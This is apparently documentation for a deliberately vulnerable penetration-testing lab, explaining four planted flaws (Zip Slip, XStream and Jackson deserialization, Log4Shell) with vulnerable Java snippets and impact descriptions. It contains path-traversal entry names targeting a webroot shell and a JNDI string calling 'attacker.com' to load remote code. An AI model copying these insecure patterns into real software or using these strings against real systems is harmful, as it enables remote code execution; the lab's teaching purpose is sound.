# Technical Breakdown of Main Vulnerabilities in SIMIPKIT Lab

This document provides a detailed technical analysis of the 4 intentionally introduced vulnerabilities in the **SIMIPKIT** vulnerability assessment and penetration testing lab project.

---

## 1. Zip Slip (Arbitrary File Write via Path Traversal)

### **Overview & Identification**
- **Vulnerability Type**: Path Traversal / Arbitrary File Overwrite (`Zip Slip`)
- **CVE Identifier**: [CVE-2018-1002202](https://nvd.nist.gov/vuln/detail/CVE-2018-1002202)
- **Vulnerable Component**: `net.lingala.zip4j:zip4j` version `1.3.1`
- **Location**: `DocumentBulkService.java` inside `extractBulkUpload()`

### **Root Cause Analysis**
In `zip4j` versions prior to `1.3.3`, the `ZipFile.extractAll(String destinationPath)` method does not perform path sanitization or canonicalization checks on entry filenames embedded within ZIP archives.

When an archive contains entry names with directory traversal sequences (such as `../../../../tmp/malicious.jsp` or `../../../../var/www/html/shell.jsp`), the library concatenates the destination path directly with the un-sanitized entry path:
$$\text{Output Path} = \text{destinationPath} + \text{entryName}$$

Since no boundary validation is performed to verify that `Output Path` resides within `destinationPath`, the extracted file is written anywhere on the target filesystem where the application process has write permissions.

### **Vulnerable Code Snippet**

File: `src/main/java/com/happy/simipkit/service/DocumentBulkService.java`
```java
// Vulnerable dependency declared in pom.xml:
// <zip4j.version>1.3.1</zip4j.version>

public int extractBulkUpload(MultipartFile zipFile, String clientId) throws IOException {
    ...
    String extractionTarget = UPLOAD_BASE_DIR + clientId + "/";
    File targetDir = new File(extractionTarget);
    targetDir.mkdirs();

    try {
        ZipFile zip = new ZipFile(tempZip);
        logger.info("Extracting bulk document upload for client {} to {}", clientId, extractionTarget);
        
        // VULNERABLE LINE: Unsanitized extraction allowing arbitrary file write
        zip.extractAll(extractionTarget);
        
        logger.info("Bulk document extraction completed for client {}", clientId);
    ...
```

### **Exploitation Impact**
An attacker can craft a malicious ZIP archive containing entries formatted with path traversal prefixes. When uploaded via the Bulk KYC Upload feature (`/documents/bulk-upload`), the files escape `/opt/simipkit/uploads/documents/<clientId>/` and can overwrite application configuration files, plant JSP web shells in public webroot directories, or write SSH keys/cron jobs for Remote Code Execution (RCE).

---

## 2. XStream Deserialization Remote Code Execution (RCE)

### **Overview & Identification**
- **Vulnerability Type**: Unsafe XML Deserialization / Dynamic Class Instantiation
- **CVE Identifier**: [CVE-2020-26217](https://nvd.nist.gov/vuln/detail/CVE-2020-26217) (and related XStream gadgets)
- **Vulnerable Component**: `com.thoughtworks.xstream:xstream` version `1.4.10`
- **Location**: `ReportService.java` inside `parseReportTemplate()`

### **Root Cause Analysis**
XStream versions prior to `1.4.14` used an opt-out (blocklist) security mechanism rather than an opt-in (whitelist/default-deny) model. When `xstream.fromXML(xmlString)` is called without establishing strict security permissions via `xstream.addPermission()` or `XStream.setupDefaultSecurity(xstream)`, the library blindly deserializes arbitrary Java objects specified by tag names or class attributes in the XML input.

Attackers can supply marshaled XML payloads utilizing JDK dynamic proxies, `java.lang.ProcessBuilder`, or ImageIO transformer gadgets (such as `javax.imageio.ImageIO$ContainsFilter` or `java.beans.EventHandler`). Upon unmarshaling, XStream instantiates these objects and invokes getter/event handling methods, resulting in arbitrary system command execution.

### **Vulnerable Code Snippet**

File: `src/main/java/com/happy/simipkit/service/ReportService.java`
```java
// Vulnerable dependency declared in pom.xml:
// <xstream.version>1.4.10</xstream.version>

public ReportService(JdbcTemplate jdbcTemplate) {
    this.jdbcTemplate = jdbcTemplate;
    // VULNERABLE INSTANTIATION: Default XStream instance without security permissions
    this.xstream = new XStream();
    // Intentionally missing:
    // XStream.setupDefaultSecurity(this.xstream);
    // this.xstream.allowTypes(...);
}

public ReportLayoutConfig parseReportTemplate(String xmlContent) {
    ...
    // VULNERABLE LINE: Unsafe deserialization of attacker-controlled XML
    Object parsed = xstream.fromXML(xmlContent);
    ...
}
```

### **Exploitation Impact**
An authenticated administrator uploading a custom PDF report layout template at `/report-template-upload` can submit a crafted XML payload. When `ReportService.parseReportTemplate()` parses the input, the underlying Java process executes arbitrary operating system commands with full web-server privileges.

---

## 3. Jackson Polymorphic Deserialization RCE

### **Overview & Identification**
- **Vulnerability Type**: Polymorphic JSON Deserialization RCE
- **CVE Identifier**: [CVE-2019-14379](https://nvd.nist.gov/vuln/detail/CVE-2019-14379) (and related Jackson gadget chains)
- **Vulnerable Component**: `com.fasterxml.jackson.core:jackson-databind` version `2.9.8`
- **Location**: `BankSyncService.java` combined with `@JsonTypeInfo` in `BankTransactionEvent.java`

### **Root Cause Analysis**
Polymorphic deserialization allows Jackson to instantiate concrete subclasses based on class metadata stored within JSON properties. 

In `BankTransactionEvent.java`, the model class is annotated with:
```java
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS, property = "@class")
```
This instructs Jackson to read the `@class` field in incoming JSON requests and load/instantiate the fully qualified Java class named in that field.

In `BankSyncService.java`, `ObjectMapper` is instantiated using default settings without configuring a `PolymorphicTypeValidator` or calling `activateDefaultTyping` restrictions. Combined with Jackson `2.9.8` (which lacks comprehensive gadget class blocklists), an attacker can supply known gadget classes present in the application's classpath (e.g., Spring framework context utilities or DB connection pools) via the `@class` attribute. During `objectMapper.readValue()`, Jackson invokes setter methods or constructors on the gadget class, triggering arbitrary code execution.

### **Vulnerable Code Snippet**

File: `src/main/java/com/happy/simipkit/model/banksync/BankTransactionEvent.java`
```java
// Polymorphic type binding enabled without class restrictions
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS, property = "@class")
public abstract class BankTransactionEvent {
    ...
}
```

File: `src/main/java/com/happy/simipkit/service/BankSyncService.java`
```java
// Vulnerable dependency declared in pom.xml:
// <jackson.version>2.9.8</jackson.version>

public BankSyncService(JdbcTemplate jdbcTemplate) {
    this.jdbcTemplate = jdbcTemplate;
    // VULNERABLE INSTANTIATION: Default ObjectMapper with no PolymorphicTypeValidator
    this.objectMapper = new ObjectMapper();
}

public void processIncomingFeed(String rawJsonPayload) throws Exception {
    ...
    // VULNERABLE LINE: Unsafe deserialization to base polymorphic type
    BankTransactionEvent event = objectMapper.readValue(rawJsonPayload, BankTransactionEvent.class);
    ...
}
```

### **Exploitation Impact**
An unauthenticated or automated external bank integration endpoint (`POST /bank-sync`) receiving malicious JSON payloads can trigger Remote Code Execution on the host system without requiring application login credentials.

---

## 4. Log4Shell (Remote Code Execution via JNDI Injection)

### **Overview & Identification**
- **Vulnerability Type**: JNDI Injection / Message Lookup Substitution RCE (`Log4Shell`)
- **CVE Identifier**: [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- **Vulnerable Component**: `org.apache.logging.log4j:log4j-core` version `2.14.1`
- **Location**: `AuditLogService.java` inside `logAction()`

### **Root Cause Analysis**
Log4j versions `2.0-beta9` through `2.14.1` feature Log4j2 Message Lookups by default. When logging user input containing formatting syntax such as `${jndi:ldap://attacker.com/exploit}`, Log4j2 evaluates the expression through its `JndiLookup` class.

The `JndiLookup` plugin initiates an outbound Java Naming and Directory Interface (JNDI) lookup request over LDAP, RMI, or CORBA to the attacker-controlled server (`attacker.com`). The malicious LDAP/RMI server responds with a reference object pointing to a remote Java class file. Log4j loads and executes the compiled Java class inside the JVM instance.

### **Vulnerable Code Snippet**

File: `src/main/java/com/happy/simipkit/service/AuditLogService.java`
```java
// Vulnerable dependency declared in pom.xml:
// <log4j.version>2.14.1</log4j.version>

public void logAction(Integer userId, String action, String ipAddress, String detail) {
    // VULNERABLE LINE: User-controlled string formatted directly into Log4j logger
    logger.info("AUDIT LOG -> User: {}, Action: {}, IP: {}, Detail: {}", userId, action, ipAddress, detail);

    String sql = "INSERT INTO audit_log (user_id, action, ip_address, detail) VALUES (?, ?, ?, ?)";
    ...
}
```

### **Exploitation Impact**
Any user activity trigger that gets recorded into the audit log (such as user logins, file uploads, or profile modifications) can be exploited by placing a Log4j JNDI string `${jndi:ldap://...}` in user fields like `Username`, `Detail`, or headers. When `AuditLogService.logAction()` processes the entry, Log4j executes the outbound JNDI lookup, leading to immediate full system compromise (RCE).
